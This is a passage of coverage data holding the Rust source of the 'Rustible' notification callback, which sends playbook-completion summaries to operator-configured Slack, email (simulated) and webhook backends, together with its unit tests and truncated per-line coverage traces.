\"1\")\n            .unwrap_or(true);\n\n        Self {\n            slack,\n            email,\n            webhook,\n            notify_on_success,\n            notify_on_failure,\n        }\n    }\n\n    /// Check if any notification backend is configured.\n    pub fn has_backends(\u0026self) -\u003e bool {\n        self.slack.is_some() || self.email.is_some() || self.webhook.is_some()\n    }\n}\n\n/// Slack webhook configuration.\n#[derive(Debug, Clone)]\npub struct SlackConfig {\n    /// Incoming webhook URL\n    pub webhook_url: String,\n    /// Optional channel override\n    pub channel: Option\u003cString\u003e,\n    /// Bot username (defaults to \"Rustible\")\n    pub username: String,\n    /// Icon emoji (defaults to \":gear:\")\n    pub icon_emoji: String,\n}\n\nimpl SlackConfig {\n    /// Load Slack configuration from environment variables.\n    pub fn from_env() -\u003e Option\u003cSelf\u003e {\n        let webhook_url = env::var(\"RUSTIBLE_SLACK_WEBHOOK_URL\").ok()?;\n\n        Some(Self {\n            webhook_url,\n            channel: env::var(\"RUSTIBLE_SLACK_CHANNEL\").ok(),\n            username: env::var(\"RUSTIBLE_SLACK_USERNAME\")\n                .unwrap_or_else(|_| \"Rustible\".to_string()),\n            icon_emoji: env::var(\"RUSTIBLE_SLACK_ICON_EMOJI\")\n                .unwrap_or_else(|_| \":gear:\".to_string()),\n        })\n    }\n}\n\n/// Email (SMTP) configuration.\n#[derive(Debug, Clone)]\npub struct EmailConfig {\n    /// SMTP server hostname\n    pub host: String,\n    /// SMTP server port\n    pub port: u16,\n    /// SMTP username for authentication\n    pub username: Option\u003cString\u003e,\n    /// SMTP password for authentication\n    pub password: Option\u003cString\u003e,\n    /// Sender email address\n    pub from: String,\n    /// Recipient email addresses\n    pub to: Vec\u003cString\u003e,\n    /// Use TLS\n    pub use_tls: bool,\n}\n\nimpl EmailConfig {\n    /// Load email configuration from environment variables.\n    pub fn from_env() -\u003e Option\u003cSelf\u003e {\n        let host = env::var(\"RUSTIBLE_SMTP_HOST\").ok()?;\n        let from = env::var(\"RUSTIBLE_SMTP_FROM\").ok()?;\n        let to_str = env::var(\"RUSTIBLE_SMTP_TO\").ok()?;\n\n        let to: Vec\u003cString\u003e = to_str\n            .split(',')\n            .map(|s| s.trim().to_string())\n            .filter(|s| !s.is_empty())\n            .collect();\n\n        if to.is_empty() {\n            return None;\n        }\n\n        let port = env::var(\"RUSTIBLE_SMTP_PORT\")\n            .ok()\n            .and_then(|p| p.parse().ok())\n            .unwrap_or(587);\n\n        let use_tls = env::var(\"RUSTIBLE_SMTP_TLS\")\n            .map(|v| !v.eq_ignore_ascii_case(\"false\") \u0026\u0026 v != \"0\")\n            .unwrap_or(true);\n\n        Some(Self {\n            host,\n            port,\n            username: env::var(\"RUSTIBLE_SMTP_USER\").ok(),\n            password: env::var(\"RUSTIBLE_SMTP_PASSWORD\").ok(),\n            from,\n            to,\n            use_tls,\n        })\n    }\n}\n\n/// Generic HTTP webhook configuration.\n#[derive(Debug, Clone)]\npub struct WebhookConfig {\n    /// Webhook URL\n    pub url: String,\n    /// HTTP method (GET, POST, PUT, etc.)\n    pub method: String,\n    /// Optional custom headers\n    pub headers: HashMap\u003cString, String\u003e,\n    /// Optional Bearer token for authorization\n    pub auth_token: Option\u003cString\u003e,\n}\n\nimpl WebhookConfig {\n    /// Load webhook configuration from environment variables.\n    pub fn from_env() -\u003e Option\u003cSelf\u003e {\n        let url = env::var(\"RUSTIBLE_WEBHOOK_URL\").ok()?;\n\n        let method = env::var(\"RUSTIBLE_WEBHOOK_METHOD\").unwrap_or_else(|_| \"POST\".to_string());\n\n        let headers: HashMap\u003cString, String\u003e = env::var(\"RUSTIBLE_WEBHOOK_HEADERS\")\n            .ok()\n            .and_then(|h| serde_json::from_str(\u0026h).ok())\n            .unwrap_or_default();\n\n        let auth_token = env::var(\"RUSTIBLE_WEBHOOK_AUTH_TOKEN\").ok();\n\n        Some(Self {\n            url,\n            method,\n            headers,\n            auth_token,\n        })\n    }\n}\n\n/// Notification payload sent to backends.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct NotificationPayload {\n    /// Playbook name/path\n    pub playbook: String,\n    /// Overall status (success/failure)\n    pub status: NotificationStatus,\n    /// Execution duration in seconds\n    pub duration_secs: f64,\n    /// Per-host statistics\n    pub host_stats: HashMap\u003cString, HostStatsSummary\u003e,\n    /// Timestamp of completion (ISO 8601)\n    pub timestamp: String,\n    /// Optional failure details\n    pub failure_details: Option\u003cVec\u003cFailureDetail\u003e\u003e,\n}\n\n/// Notification status.\n#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]\n#[serde(rename_all = \"lowercase\")]\npub enum NotificationStatus {\n    /// Playbook completed successfully\n    Success,\n    /// Playbook failed\n    Failure,\n}\n\nimpl std::fmt::Display for NotificationStatus {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        match self {\n            NotificationStatus::Success =\u003e write!(f, \"SUCCESS\"),\n            NotificationStatus::Failure =\u003e write!(f, \"FAILURE\"),\n        }\n    }\n}\n\n/// Summary of host execution statistics.\n#[derive(Debug, Clone, Default, Serialize, Deserialize)]\npub struct HostStatsSummary {\n    /// Tasks completed successfully without changes\n    pub ok: u32,\n    /// Tasks that made changes\n    pub changed: u32,\n    /// Tasks that failed\n    pub failed: u32,\n    /// Tasks that were skipped\n    pub skipped: u32,\n    /// Unreachable attempts\n    pub unreachable: u32,\n}\n\nimpl HostStatsSummary {\n    /// Check if any failures occurred.\n    pub fn has_failures(\u0026self) -\u003e bool {\n        self.failed \u003e 0 || self.unreachable \u003e 0\n    }\n}\n\n/// Details about a specific failure.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct FailureDetail {\n    /// Host where failure occurred\n    pub host: String,\n    /// Task that failed\n    pub task: String,\n    /// Error message\n    pub message: String,\n}\n\n/// Internal state for tracking execution.\n#[derive(Debug, Default)]\nstruct ExecutionState {\n    /// Start time of playbook execution\n    start_time: Option\u003cInstant\u003e,\n    /// Current playbook name\n    playbook: Option\u003cString\u003e,\n    /// Per-host statistics\n    host_stats: HashMap\u003cString, HostStatsSummary\u003e,\n    /// Recorded failures\n    failures: Vec\u003cFailureDetail\u003e,\n    /// Whether any failures occurred\n    has_failures: bool,\n}\n\n/// Notification callback plugin that sends alerts on playbook completion or failure.\n///\n/// This callback integrates with external notification services to provide\n/// real-time alerts about playbook execution status. It's particularly useful\n/// for CI/CD pipelines and monitoring infrastructure automation.\n///\n/// # Design Principles\n///\n/// 1. **Minimal Noise**: Only triggers on completion or failure by default\n/// 2. **Multiple Backends**: Supports Slack, email, and generic webhooks\n/// 3. **Configurable**: All settings via environment variables\n/// 4. **Async**: Non-blocking notification delivery\n/// 5. **Resilient**: Failures in notification don't affect playbook execution\n///\n/// # Usage\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::notification::NotificationCallback;\n///\n/// let callback = NotificationCallback::new();\n/// executor.with_callback(Box::new(callback));\n/// ```\n#[derive(Debug)]\npub struct NotificationCallback {\n    /// Configuration loaded from environment\n    config: NotificationConfig,\n    /// HTTP client for making requests\n    client: Client,\n    /// Internal execution state\n    state: Arc\u003cRwLock\u003cExecutionState\u003e\u003e,\n}\n\nimpl NotificationCallback {\n    /// Creates a new notification callback with configuration from environment variables.\n    #[must_use]\n    pub fn new() -\u003e Self {\n        let config = NotificationConfig::from_env();\n\n        if !config.has_backends() {\n            debug!(\"No notification backends configured\");\n        } else {\n            info!(\n                \"Notification callback initialized with backends: {}\",\n                Self::describe_backends(\u0026config)\n            );\n        }\n\n        Self {\n            config,\n            client: Client::builder()\n                .timeout(Duration::from_secs(30))\n                .build()\n                .unwrap_or_default(),\n            state: Arc::new(RwLock::new(ExecutionState::default())),\n        }\n    }\n\n    /// Creates a new notification callback with custom configuration.\n    #[must_use]\n    pub fn with_config(config: NotificationConfig) -\u003e Self {\n        Self {\n            config,\n            client: Client::builder()\n                .timeout(Duration::from_secs(30))\n                .build()\n                .unwrap_or_default(),\n            state: Arc::new(RwLock::new(ExecutionState::default())),\n        }\n    }\n\n    /// Returns a human-readable description of configured backends.\n    fn describe_backends(config: \u0026NotificationConfig) -\u003e String {\n        let mut backends = Vec::new();\n        if config.slack.is_some() {\n            backends.push(\"Slack\");\n        }\n        if config.email.is_some() {\n            backends.push(\"Email\");\n        }\n        if config.webhook.is_some() {\n            backends.push(\"Webhook\");\n        }\n        backends.join(\", \")\n    }\n\n    /// Sends notifications to all configured backends.\n    async fn send_notifications(\u0026self, payload: NotificationPayload) {\n        let should_send = match payload.status {\n            NotificationStatus::Success =\u003e self.config.notify_on_success,\n            NotificationStatus::Failure =\u003e self.config.notify_on_failure,\n        };\n\n        if !should_send {\n            debug!(\n                \"Skipping notification for status {:?} (not configured to notify)\",\n                payload.status\n            );\n            return;\n        }\n\n        let mut handles = Vec::new();\n\n        if let Some(ref slack_config) = self.config.slack {\n            let client = self.client.clone();\n            let config = slack_config.clone();\n            let payload = payload.clone();\n            handles.push(tokio::spawn(async move {\n                if let Err(e) = send_slack_notification(\u0026client, \u0026config, \u0026payload).await {\n                    error!(\"Failed to send Slack notification: {}\", e);\n                }\n            }));\n        }\n\n        if let Some(ref email_config) = self.config.email {\n            let config = email_config.clone();\n            let payload = payload.clone();\n            handles.push(tokio::spawn(async move {\n                if let Err(e) = send_email_notification(\u0026config, \u0026payload).await {\n                    error!(\"Failed to send email notification: {}\", e);\n                }\n            }));\n        }\n\n        if let Some(ref webhook_config) = self.config.webhook {\n            let client = self.client.clone();\n            let config = webhook_config.clone();\n            let payload = payload.clone();\n            handles.push(tokio::spawn(async move {\n                if let Err(e) = send_webhook_notification(\u0026client, \u0026config, \u0026payload).await {\n                    error!(\"Failed to send webhook notification: {}\", e);\n                }\n            }));\n        }\n\n        for handle in handles {\n            let _ = tokio::time::timeout(Duration::from_secs(30), handle).await;\n        }\n    }\n}\n\nimpl Default for NotificationCallback {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\nimpl Clone for NotificationCallback {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            config: self.config.clone(),\n            client: self.client.clone(),\n            state: Arc::clone(\u0026self.state),\n        }\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for NotificationCallback {\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        let mut state = self.state.write().await;\n        state.start_time = Some(Instant::now());\n        state.playbook = Some(name.to_string());\n        state.host_stats.clear();\n        state.failures.clear();\n        state.has_failures = false;\n    }\n\n    async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) {\n        if !self.config.has_backends() {\n            return;\n        }\n\n        let state = self.state.read().await;\n\n        let duration_secs = state\n            .start_time\n            .map(|t| t.elapsed().as_secs_f64())\n            .unwrap_or(0.0);\n\n        let status = if state.has_failures || !success {\n            NotificationStatus::Failure\n        } else {\n            NotificationStatus::Success\n        };\n\n        let host_stats = state.host_stats.clone();\n        let failure_details = if state.failures.is_empty() {\n            None\n        } else {\n            Some(state.failures.clone())\n        };\n\n        let payload = NotificationPayload {\n            playbook: name.to_string(),\n            status,\n            duration_secs,\n            host_stats,\n            timestamp: chrono::Utc::now().to_rfc3339(),\n            failure_details,\n        };\n\n        drop(state);\n        self.send_notifications(payload).await;\n    }\n\n    async fn on_play_start(\u0026self, _name: \u0026str, hosts: \u0026[String]) {\n        let mut state = self.state.write().await;\n        for host in hosts {\n            state\n                .host_stats\n                .entry(host.clone())\n                .or_insert_with(HostStatsSummary::default);\n        }\n    }\n\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        let mut state = self.state.write().await;\n\n        let stats = state\n            .host_stats\n            .entry(result.host.clone())\n            .or_insert_with(HostStatsSummary::default);\n\n        if result.result.skipped {\n            stats.skipped += 1;\n        } else if !result.result.success {\n            stats.failed += 1;\n            state.has_failures = true;\n            state.failures.push(FailureDetail {\n                host: result.host.clone(),\n                task: result.task_name.clone(),\n                message: result.result.message.clone(),\n            });\n        } else if result.result.changed {\n            stats.changed += 1;\n        } else {\n            stats.ok += 1;\n        }\n    }\n}\n\n// =============================================================================\n// Notification Backend Implementations\n// =============================================================================\n\n#[derive(Debug, Serialize)]\nstruct SlackMessage {\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    channel: Option\u003cString\u003e,\n    username: String,\n    icon_emoji: String,\n    attachments: Vec\u003cSlackAttachment\u003e,\n}\n\n#[derive(Debug, Serialize)]\nstruct SlackAttachment {\n    fallback: String,\n    color: String,\n    title: String,\n    text: String,\n    fields: Vec\u003cSlackField\u003e,\n    footer: String,\n    ts: i64,\n}\n\n#[derive(Debug, Serialize)]\nstruct SlackField {\n    title: String,\n    value: String,\n    short: bool,\n}\n\nasync fn send_slack_notification(\n    client: \u0026Client,\n    config: \u0026SlackConfig,\n    payload: \u0026NotificationPayload,\n) -\u003e Result\u003c(), Box\u003cdyn std::error::Error + Send + Sync\u003e\u003e {\n    let color = match payload.status {\n        NotificationStatus::Success =\u003e \"#36a64f\",\n        NotificationStatus::Failure =\u003e \"#dc3545\",\n    };\n\n    let mut host_lines = Vec::new();\n    for (host, stats) in \u0026payload.host_stats {\n        host_lines.push(format!(\n            \"- {}: ok={} changed={} failed={} skipped={}\",\n            host, stats.ok, stats.changed, stats.failed, stats.skipped\n        ));\n    }\n    let host_summary = if host_lines.is_empty() {\n        \"No hosts executed\".to_string()\n    } else {\n        host_lines.join(\"\\n\")\n    };\n\n    let failure_text = payload.failure_details.as_ref().map(|failures| {\n        failures\n            .iter()\n            .map(|f| format!(\"- {} on {}: {}\", f.task, f.host, f.message))\n            .collect::\u003cVec\u003c_\u003e\u003e()\n            .join(\"\\n\")\n    });\n\n    let mut fields = vec![\n        SlackField {\n            title: \"Status\".to_string(),\n            value: payload.status.to_string(),\n            short: true,\n        },\n        SlackField {\n            title: \"Duration\".to_string(),\n            value: format!(\"{:.2}s\", payload.duration_secs),\n            short: true,\n        },\n    ];\n\n    if let Some(ref failures) = failure_text {\n        fields.push(SlackField {\n            title: \"Failures\".to_string(),\n            value: failures.clone(),\n            short: false,\n        });\n    }\n\n    let attachment = SlackAttachment {\n        fallback: format!(\"Rustible: {} - {}\", payload.playbook, payload.status),\n        color: color.to_string(),\n        title: format!(\"Playbook: {}\", payload.playbook),\n        text: host_summary,\n        fields,\n        footer: \"Rustible Notification\".to_string(),\n        ts: chrono::Utc::now().timestamp(),\n    };\n\n    let message = SlackMessage {\n        channel: config.channel.clone(),\n        username: config.username.clone(),\n        icon_emoji: config.icon_emoji.clone(),\n        attachments: vec![attachment],\n    };\n\n    let response = client\n        .post(\u0026config.webhook_url)\n        .json(\u0026message)\n        .send()\n        .await?;\n\n    if !response.status().is_success() {\n        let status = response.status();\n        let body = response.text().await.unwrap_or_default();\n        return Err(format!(\"Slack API returned {}: {}\", status, body).into());\n    }\n\n    info!(\"Slack notification sent successfully\");\n    Ok(())\n}\n\nasync fn send_email_notification(\n    config: \u0026EmailConfig,\n    payload: \u0026NotificationPayload,\n) -\u003e Result\u003c(), Box\u003cdyn std::error::Error + Send + Sync\u003e\u003e {\n    let subject = format!(\"Rustible: {} - {}\", payload.playbook, payload.status);\n\n    let mut body = format!(\n        \"Rustible Playbook Execution Report\\n\\\n         ====================================\\n\\n\\\n         Playbook: {}\\n\\\n         Status: {}\\n\\\n         Duration: {:.2}s\\n\\\n         Timestamp: {}\\n\\n\\\n         Host Summary:\\n\",\n        payload.playbook, payload.status, payload.duration_secs, payload.timestamp\n    );\n\n    for (host, stats) in \u0026payload.host_stats {\n        body.push_str(\u0026format!(\n            \"  - {}: ok={} changed={} failed={} skipped={}\\n\",\n            host, stats.ok, stats.changed, stats.failed, stats.skipped\n        ));\n    }\n\n    if let Some(ref failures) = payload.failure_details {\n        body.push_str(\"\\nFailure Details:\\n\");\n        for failure in failures {\n            body.push_str(\u0026format!(\n                \"  - {} on {}: {}\\n\",\n                failure.task, failure.host, failure.message\n            ));\n        }\n    }\n\n    warn!(\n        \"Email notification simulated (lettre not integrated). Would send to: {:?}\",\n        config.to\n    );\n    debug!(\"Email subject: {}\", subject);\n    debug!(\"Email body:\\n{}\", body);\n\n    info!(\"Email notification prepared (requires lettre integration for actual sending)\");\n    Ok(())\n}\n\nasync fn send_webhook_notification(\n    client: \u0026Client,\n    config: \u0026WebhookConfig,\n    payload: \u0026NotificationPayload,\n) -\u003e Result\u003c(), Box\u003cdyn std::error::Error + Send + Sync\u003e\u003e {\n    let method = match config.method.to_uppercase().as_str() {\n        \"GET\" =\u003e reqwest::Method::GET,\n        \"POST\" =\u003e reqwest::Method::POST,\n        \"PUT\" =\u003e reqwest::Method::PUT,\n        \"PATCH\" =\u003e reqwest::Method::PATCH,\n        \"DELETE\" =\u003e reqwest::Method::DELETE,\n        _ =\u003e reqwest::Method::POST,\n    };\n\n    let mut request = client.request(method, \u0026config.url);\n\n    for (key, value) in \u0026config.headers {\n        request = request.header(key, value);\n    }\n\n    if let Some(ref token) = config.auth_token {\n        request = request.header(\"Authorization\", format!(\"Bearer {}\", token));\n    }\n\n    request = request\n        .header(\"Content-Type\", \"application/json\")\n        .json(payload);\n\n    let response = request.send().await?;\n\n    if !response.status().is_success() {\n        let status = response.status();\n        let body = response.text().await.unwrap_or_default();\n        return Err(format!(\"Webhook returned {}: {}\", status, body).into());\n    }\n\n    info!(\"Webhook notification sent successfully to {}\", config.url);\n    Ok(())\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_notification_config_from_env_empty() {\n        env::remove_var(\"RUSTIBLE_SLACK_WEBHOOK_URL\");\n        env::remove_var(\"RUSTIBLE_SMTP_HOST\");\n        env::remove_var(\"RUSTIBLE_WEBHOOK_URL\");\n\n        let config = NotificationConfig::from_env();\n        assert!(!config.has_backends());\n    }\n\n    #[test]\n    fn test_notification_status_display() {\n        assert_eq!(format!(\"{}\", NotificationStatus::Success), \"SUCCESS\");\n        assert_eq!(format!(\"{}\", NotificationStatus::Failure), \"FAILURE\");\n    }\n\n    #[test]\n    fn test_host_stats_summary_default() {\n        let stats = HostStatsSummary::default();\n        assert_eq!(stats.ok, 0);\n        assert_eq!(stats.changed, 0);\n        assert_eq!(stats.failed, 0);\n        assert_eq!(stats.skipped, 0);\n        assert_eq!(stats.unreachable, 0);\n        assert!(!stats.has_failures());\n    }\n\n    #[test]\n    fn test_host_stats_has_failures() {\n        let mut stats = HostStatsSummary::default();\n        assert!(!stats.has_failures());\n\n        stats.failed = 1;\n        assert!(stats.has_failures());\n\n        stats.failed = 0;\n        stats.unreachable = 1;\n        assert!(stats.has_failures());\n    }\n\n    #[test]\n    fn test_notification_callback_default() {\n        let callback = NotificationCallback::default();\n        assert!(!callback.config.has_backends());\n    }\n\n    #[test]\n    fn test_notification_callback_clone() {\n        let callback1 = NotificationCallback::new();\n        let callback2 = callback1.clone();\n        assert!(Arc::ptr_eq(\u0026callback1.state, \u0026callback2.state));\n    }\n\n    #[test]\n    fn test_describe_backends() {\n        let config = NotificationConfig {\n            slack: Some(SlackConfig {\n                webhook_url: \"https://hooks.slack.com/test\".to_string(),\n                channel: None,\n                username: \"Test\".to_string(),\n                icon_emoji: \":gear:\".to_string(),\n            }),\n            email: None,\n            webhook: Some(WebhookConfig {\n                url: \"https://example.com/webhook\".to_string(),\n                method: \"POST\".to_string(),\n                headers: HashMap::new(),\n                auth_token: None,\n            }),\n            notify_on_success: false,\n            notify_on_failure: true,\n        };\n\n        let description = NotificationCallback::describe_backends(\u0026config);\n        assert!(description.contains(\"Slack\"));\n        assert!(description.contains(\"Webhook\"));\n        assert!(!description.contains(\"Email\"));\n    }\n\n    #[tokio::test]\n    async fn test_playbook_start_initializes_state() {\n        let callback = NotificationCallback::new();\n        callback.on_playbook_start(\"test-playbook.yml\").await;\n\n        let state = callback.state.read().await;\n        assert!(state.start_time.is_some());\n        assert_eq!(state.playbook, Some(\"test-playbook.yml\".to_string()));\n        assert!(state.host_stats.is_empty());\n        assert!(state.failures.is_empty());\n        assert!(!state.has_failures);\n    }\n\n    #[test]\n    fn test_webhook_config_method_defaults() {\n        let config = WebhookConfig {\n            url: \"https://example.com\".to_string(),\n            method: \"POST\".to_string(),\n            headers: HashMap::new(),\n            auth_token: None,\n        };\n        assert_eq!(config.method, \"POST\");\n    }\n\n    #[test]\n    fn test_email_config_to_parsing() {\n        let to_str = \"user1@example.com, user2@example.com, \";\n        let to: Vec\u003cString\u003e = to_str\n            .split(',')\n            .map(|s| s.trim().to_string())\n            .filter(|s| !s.is_empty())\n            .collect();\n\n        assert_eq!(to.len(), 2);\n        assert_eq!(to[0], \"user1@example.com\");\n        assert_eq!(to[1], \"user2@example.com\");\n    }\n}\n","traces":[{"line":85,"address":[25367989,25367440,25367995],"length":1,"stats":{"Line":1}},{"line":86,"address":[25367462],"length":1,"stats":{"Line":1}},{"line":87,"address":[25367475],"length":1,"stats":{"Line":1}},{"line":88,"address":[25367527],"length":1,"stats":{"Line":1}},{"line":90,"address":[25367687,25367571],"length":1,"stats":{"Line":2}},{"line":91,"address":[24285497,24285488],"length":1,"stats":{"Line":1}},{"line":94,"address":[25367778,25367696],"length":1,"stats":{"Line":2}},{"line":95,"address":[24285296,24285305],"length":1,"stats":{"Line":1}},{"line":108,"address":[25367344],"length":1,"stats":{"Line":1}},{"line":109,"address":[25367357],"length":1,"stats":{"Line":1}},{"line":128,"address":[25366386,25365616,25366402],"length":1,"stats":{"Line":1}},{"line":129,"address":[25365751,25365632],"length":1,"stats":{"Line":1}},{"line":131,"address":[25366155],"length":1,"stats":{"Line":0}},{"line":132,"address":[25365811],"length":1,"stats":{"Line":0}},{"line":133,"address":[25365845,25365920],"length":1,"stats":{"Line":0}},{"line":134,"address":[25365947],"length":1,"stats":{"Line":0}},{"line":135,"address":[24284912,24284928],"length":1,"stats":{"Line":0}},{"line":136,"address":[25366049],"length":1,"stats":{"Line":0}},{"line":137,"address":[24284800,24284816],"length":1,"stats":{"Line":0}},{"line":163,"address":[25363632,25365482,25365583],"length":1,"stats":{"Line":1}},{"line":164,"address":[25363649],"length":1,"stats":{"Line":1}},{"line":165,"address":[25365571,25363907,25363835],"length":1,"stats":{"Line":0}},{"line":166,"address":[25364085,25364157,25365526],"length":1,"stats":{"Line":0}},{"line":168,"address":[25364335],"length":1,"stats":{"Line":0}},{"line":170,"address":[24284565,24284512],"length":1,"stats":{"Line":0}},{"line":171,"address":[24284464,24284489],"length":1,"stats":{"Line":0}},{"line":174,"address":[25364499,25364570],"length":1,"stats":{"Line":0}},{"line":175,"address":[25364622],"length":1,"stats":{"Line":0}},{"line":178,"address":[25364741,25364576],"length":1,"stats":{"Line":0}},{"line":180,"address":[24284608,24284617],"length":1,"stats":{"Line":0}},{"line":183,"address":[25364749,25364831],"length":1,"stats":{"Line":0}},{"line":184,"address":[25364796],"length":1,"stats":{"Line":0}},{"line":187,"address":[25365161],"length":1,"stats":{"Line":0}},{"line":188,"address":[25364840],"length":1,"stats":{"Line":0}},{"line":190,"address":[25364949,25364874],"length":1,"stats":{"Line":0}},{"line":191,"address":[25364976,25365048],"length":1,"stats":{"Line":0}},{"line":192,"address":[25365089],"length":1,"stats":{"Line":0}},{"line":193,"address":[25365129],"length":1,"stats":{"Line":0}},{"line":214,"address":[25367274,25367280,25366432],"length":1,"stats":{"Line":1}},{"line":215,"address":[25366448],"length":1,"stats":{"Line":1}},{"line":217,"address":[25366675,25366603],"length":1,"stats":{"Line":0}},{"line":219,"address":[25366705],"length":1,"stats":{"Line":0}},{"line":221,"address":[24285136,24285163],"length":1,"stats":{"Line":0}},{"line":224,"address":[25366850,25366925],"length":1,"stats":{"Line":0}},{"line":226,"address":[25367065],"length":1,"stats":{"Line":0}},{"line":227,"address":[25366952],"length":1,"stats":{"Line":0}},{"line":228,"address":[25366991],"length":1,"stats":{"Line":0}},{"line":229,"address":[25367039],"length":1,"stats":{"Line":0}},{"line":263,"address":[25356112],"length":1,"stats":{"Line":1}},{"line":264,"address":[25356137],"length":1,"stats":{"Line":1}},{"line":265,"address":[25356193],"length":1,"stats":{"Line":1}},{"line":266,"address":[25356152],"length":1,"stats":{"Line":1}},{"line":288,"address":[25367296],"length":1,"stats":{"Line":1}},{"line":289,"address":[25367306],"length":1,"stats":{"Line":1}},{"line":354,"address":[25370669,25368960,25370641],"length":1,"stats":{"Line":1}},{"line":355,"address":[25368983],"length":1,"stats":{"Line":1}},{"line":357,"address":[25369098,25369036],"length":1,"stats":{"Line":2}},{"line":358,"address":[25369104,25369480,25369170],"length":1,"stats":{"Line":2}},{"line":360,"address":[25369674,25369963,25369132],"length":1,"stats":{"Line":0}},{"line":368,"address":[25369458,25370441,25370342],"length":1,"stats":{"Line":3}},{"line":372,"address":[25370508,25370457],"length":1,"stats":{"Line":2}},{"line":378,"address":[25368501,25368016,25368473],"length":1,"stats":{"Line":0}},{"line":381,"address":[25368291,25368060,25368192],"length":1,"stats":{"Line":0}},{"line":385,"address":[25368307,25368358],"length":1,"stats":{"Line":0}},{"line":390,"address":[25368864,25368528,25368870],"length":1,"stats":{"Line":1}},{"line":391,"address":[25368552],"length":1,"stats":{"Line":1}},{"line":392,"address":[25368571,25368621],"length":1,"stats":{"Line":2}},{"line":393,"address":[25368647],"length":1,"stats":{"Line":1}},{"line":395,"address":[25368632,25368681],"length":1,"stats":{"Line":2}},{"line":396,"address":[25368710],"length":1,"stats":{"Line":0}},{"line":398,"address":[25368692,25368744],"length":1,"stats":{"Line":2}},{"line":399,"address":[25368775],"length":1,"stats":{"Line":1}},{"line":401,"address":[25368819,25368750],"length":1,"stats":{"Line":2}},{"line":405,"address":[25368915,25368880],"length":1,"stats":{"Line":0}},{"line":406,"address":[24293816],"length":1,"stats":{"Line":0}},{"line":407,"address":[24293913],"length":1,"stats":{"Line":0}},{"line":408,"address":[24293888],"length":1,"stats":{"Line":0}},{"line":411,"address":[24293928],"length":1,"stats":{"Line":0}},{"line":412,"address":[24294335,24294045,24293938],"length":1,"stats":{"Line":0}},{"line":419,"address":[24293974],"length":1,"stats":{"Line":0}},{"line":421,"address":[24295302,24294732],"length":1,"stats":{"Line":0}},{"line":422,"address":[24294787,24294904],"length":1,"stats":{"Line":0}},{"line":423,"address":[24294928,24294989],"length":1,"stats":{"Line":0}},{"line":424,"address":[24294997],"length":1,"stats":{"Line":0}},{"line":425,"address":[24297626,24297473,24298470,24297376,24297401,24298581,24295065],"length":1,"stats":{"Line":0}},{"line":426,"address":[26101016],"length":1,"stats":{"Line":0}},{"line":427,"address":[24298203,24297880,24297958],"length":1,"stats":{"Line":0}},{"line":432,"address":[24294814,24295820,24295387],"length":1,"stats":{"Line":0}},{"line":433,"address":[24295407,24295507],"length":1,"stats":{"Line":0}},{"line":434,"address":[24295515],"length":1,"stats":{"Line":0}},{"line":435,"address":[24298688,24295583,24299823,24298772,24299758,24298925,24298713],"length":1,"stats":{"Line":0}},{"line":436,"address":[26101421],"length":1,"stats":{"Line":0}},{"line":437,"address":[24299257,24299502,24299179],"length":1,"stats":{"Line":0}},{"line":442,"address":[24295422,24296438,24295851],"length":1,"stats":{"Line":0}},{"line":443,"address":[24296008,24295873],"length":1,"stats":{"Line":0}},{"line":444,"address":[24296032,24296093],"length":1,"stats":{"Line":0}},{"line":445,"address":[24296101],"length":1,"stats":{"Line":0}},{"line":446,"address":[24300218,24301062,24301173,24299993,24300065,24296169,24299968],"length":1,"stats":{"Line":0}},{"line":447,"address":[24300249,24300497,24300033,24300092,24300160],"length":1,"stats":{"Line":0}},{"line":448,"address":[24300550,24300795,24300472],"length":1,"stats":{"Line":0}},{"line":453,"address":[24296516,24296980,24297050,24295900],"length":1,"stats":{"Line":0}},{"line":454,"address":[24296654,24296958,24293867,24297205,24297118,24296681],"length":1,"stats":{"Line":0}},{"line":460,"address":[25357456],"length":1,"stats":{"Line":1}},{"line":461,"address":[25357464],"length":1,"stats":{"Line":1}},{"line":466,"address":[25357048,25357042,25356800],"length":1,"stats":{"Line":1}},{"line":468,"address":[25356835],"length":1,"stats":{"Line":1}},{"line":469,"address":[25356911,25356845],"length":1,"stats":{"Line":2}},{"line":470,"address":[25356919],"length":1,"stats":{"Line":1}},{"line":477,"address":[24280258,24279241,24279485,24280313,24279216,24279316,24279355],"length":1,"stats":{"Line":4}},{"line":478,"address":[24279343,24279297,24279407,24279516],"length":1,"stats":{"Line":2}},{"line":479,"address":[24279716,24279802],"length":1,"stats":{"Line":2}},{"line":480,"address":[24279867,24279962,24280281,24279840,24280028],"length":1,"stats":{"Line":1}},{"line":481,"address":[24280149],"length":1,"stats":{"Line":1}},{"line":482,"address":[24280185],"length":1,"stats":{"Line":1}},{"line":483,"address":[24280217],"length":1,"stats":{"Line":1}},{"line":486,"address":[24275909,24277533,24276080,24275865,24277742,24275813,24275784,24275616,24275741,24275647],"length":1,"stats":{"Line":0}},{"line":487,"address":[24275723,24275859],"length":1,"stats":{"Line":0}},{"line":491,"address":[24276114,24275771,24275875,24275993],"length":1,"stats":{"Line":0}},{"line":493,"address":[24276475,24276347,24276409],"length":1,"stats":{"Line":0}},{"line":495,"address":[24277824,24277836,24276416],"length":1,"stats":{"Line":0}},{"line":498,"address":[24276484,24276529],"length":1,"stats":{"Line":0}},{"line":499,"address":[24276521],"length":1,"stats":{"Line":0}},{"line":501,"address":[24276531],"length":1,"stats":{"Line":0}},{"line":504,"address":[24276547,24276603],"length":1,"stats":{"Line":0}},{"line":505,"address":[24276697,24276634,24276768],"length":1,"stats":{"Line":0}},{"line":506,"address":[24276746],"length":1,"stats":{"Line":0}},{"line":508,"address":[24276726,24276783],"length":1,"stats":{"Line":0}},{"line":512,"address":[24276858],"length":1,"stats":{"Line":0}},{"line":516,"address":[24277005,24277064],"length":1,"stats":{"Line":0}},{"line":520,"address":[24277312],"le